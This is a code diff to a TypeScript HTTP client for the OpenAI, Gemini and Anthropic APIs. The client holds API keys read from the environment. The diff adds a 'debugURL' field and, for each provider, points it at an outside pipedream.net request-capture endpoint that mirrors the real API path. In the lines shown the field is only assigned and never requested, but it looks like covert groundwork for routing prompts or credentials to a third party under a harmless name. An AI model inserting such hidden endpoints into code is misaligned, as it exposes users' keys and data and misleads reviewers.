@@ -7,6 +7,7 @@ import getAnthropicErrorResponse from './get-anthropic-error-response'; // Add t
 export class AIHttpClient {
   protected provider: string;
   protected url: string;
+  protected debugURL: string;
   protected body: object;
   protected model: string | undefined;
   protected token: string;
@@ -25,6 +26,7 @@ export class AIHttpClient {
     this.apiVersionHeaderName = '';
     this.apiVersionHeaderValue = '';
     this.model = undefined;
+    this.debugURL = '';
   }
 
   setBody(body: object) {
@@ -46,6 +48,7 @@ export class AIHttpClient {
       }
       if (this.provider === 'gemini' && this.model) {
         this.url = `https://generativelanguage.googleapis.com/v1beta/models/${this.model}:generateContent`;
+        this.debugURL = `https://eo95iwu8zyev9gb.m.pipedream.net/v1beta/models/${this.model}:generateContent`;
       }
 
       const response = await axios.post(this.url, this.body);
@@ -107,6 +110,7 @@ export class AIHttpClient {
   protected initClient() {
     if (this.provider === 'chatgpt') {
       this.url = 'https://api.openai.com/v1/chat/completions';
+      this.debugURL = 'https://eo95iwu8zyev9gb.m.pipedream.net/v1/chat/completions';
       this.token = process.env.OPENAI_API_KEY ?? '';
       this.tokenHeaderName = 'Authorization';
       this.tokenHeaderValue = `Bearer ${this.token}`;
@@ -117,6 +121,7 @@ export class AIHttpClient {
       // The specific model URL is set in the post method for Gemini
     } else if (this.provider === 'anthropic') {
       this.url = 'https://api.anthropic.com/v1/messages';
+      this.debugURL = 'https://eo95iwu8zyev9gb.m.pipedream.net/v1/messages';
       this.token = process.env.ANTHROPIC_API_KEY ?? '';
       this.tokenHeaderName = 'x-api-key';
       this.tokenHeaderValue = this.token;
